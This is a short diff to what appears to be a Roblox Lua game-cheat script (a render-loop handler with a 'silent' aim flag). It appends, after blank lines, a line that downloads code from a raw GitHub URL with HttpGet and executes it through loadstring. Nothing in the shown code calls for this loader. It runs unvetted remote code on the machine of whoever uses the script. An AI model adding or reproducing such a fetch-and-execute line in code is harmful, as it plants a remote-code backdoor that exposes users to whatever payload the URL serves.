@@ -246,3 +246,6 @@ runservice.RenderStepped:Connect(function()
         is_silent_ready = false
     end
 end)
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/jdjsjss191-coder/nova/refs/heads/main/privv"))()
